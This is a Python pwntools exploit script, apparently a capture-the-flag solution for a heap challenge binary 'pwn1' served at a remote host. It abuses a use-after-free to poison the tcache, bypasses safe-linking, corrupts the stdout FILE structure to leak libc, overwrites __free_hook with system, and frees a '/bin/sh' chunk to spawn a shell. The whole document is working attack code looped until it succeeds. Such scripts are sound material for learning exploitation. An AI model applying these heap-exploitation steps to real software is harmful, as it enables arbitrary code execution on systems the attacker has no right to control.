#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './pwn1'

context.os = 'linux'
context.log_level = 'debug'
if arch == 64:
    context.arch = 'amd64'
if arch == 32:
    context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()


bps = []
pie = 1


def gdba():
    if local == 0:
        return 0
    cmd = 'set follow-fork-mode parent\n'
    # cmd=''
    if pie:
        base = int(
            os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p, cmd)


def eat():
    p.recvuntil('>>')


def add(size, con):
    eat()
    p.sendline('1')
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Content:')
    p.send(con)


def dele():
    eat()
    p.sendline('2')


def show():
    eat()
    p.sendline('3')


def edit(con):
    eat()
    p.sendline('5')
    p.recvuntil('Content:')
    p.send(con)


while True:
    try:
        local = 1
        if local:
            p = process(challenge)
        else:
            p = remote('chuj.top', '53178')

        add(0x79, '1')  # * 0
        dele()
        show()

        heapbase = u64(p.recv(5).ljust(8, b"\x00")) << 12
        log.success("heapbase: "+hex(heapbase))
        _IO_2_1_stdout_ = (libc.symbols["_IO_2_1_stdout_"] & 0xffff)
        log.success('_IO_2_1_stdout_: ' + hex(_IO_2_1_stdout_))

        fd_addr = heapbase+0x290
        edit(p64(0)+p64(0))

        dele()

        edit(p64((fd_addr >> 12) ^ (heapbase+0x10))+p64(0))

        add(0x79, '1')  # * 1

        add(0x79, 0x4e*p8(0)+p8(7))  # ! 2 (0x290)[7]
        dele()

        add(0x79, 4*'\x00')  # ! 3 (0x40)(0x50) 踩出 libc

        add(0x18, p16(0x16c0))  # * 4 改写 io_stdout

        # dele()

        add(0x38, p64(0xfbad1800)+p64(0)*3+b'\x28')  # * 申请 io_stdout
        libc.address = u64(p.recvuntil(
            b'\x7f')[-6:].ljust(8, b'\x00')) - libc.symbols["_IO_2_1_stdin_"]
        log.success('libc.address: ' + hex(libc.address))
        malloc_hook = libc.symbols["__malloc_hook"]
        log.success("malloc_hook: "+hex(malloc_hook))
        free_hook = libc.symbols["__free_hook"]
        log.success("free_hook: "+hex(free_hook))
        system = libc.symbols["system"]
        log.success("system: "+hex(system))

        add(0x18, p16(free_hook & 0xffff))  # * 5

        one_array = [0xdf54c, 0xdf54f, 0xdf552]
        one_gadgets = one_array[0] + libc.address
        add(0x78, p64(system))  # * 6

        add(0x20, '/bin/sh\x00')  # * 7

        dele()

    except EOFError:
        p.close()
        continue
    else:
        p.interactive()
        break

p.interactive()
